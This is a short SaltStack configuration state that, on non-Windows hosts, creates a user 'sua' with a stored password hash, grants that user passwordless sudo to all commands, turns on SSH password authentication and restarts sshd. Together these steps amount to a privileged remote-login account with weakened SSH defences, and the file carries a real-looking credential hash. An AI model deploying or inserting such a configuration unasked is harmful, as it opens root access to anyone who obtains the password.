{% if grains.os_family != 'Windows' %}
sua:
  user.present:
  - shell: /bin/bash
  - password: $6$kHEeIyZX$lgk0x.4rmzjSyBOK4lZZknMTNnHorn1/IpKaziTttVg5nHjBh17Wkr9YJwKRasuASGbjAlvdGsN7bnXfqHI7P/
  
/etc/sudoers.d/sua:
  file.managed:
  - contents:
    - sua ALL=(ALL) NOPASSWD:ALL
    
/etc/ssh/sshd_config:
  file.replace:
  - pattern: |
      PasswordAuthentication no
  - repl: |
      PasswordAuthentication yes
      
sshd:
  service.running:
  - watch:
    - file: /etc/ssh/sshd_config
{% endif %}
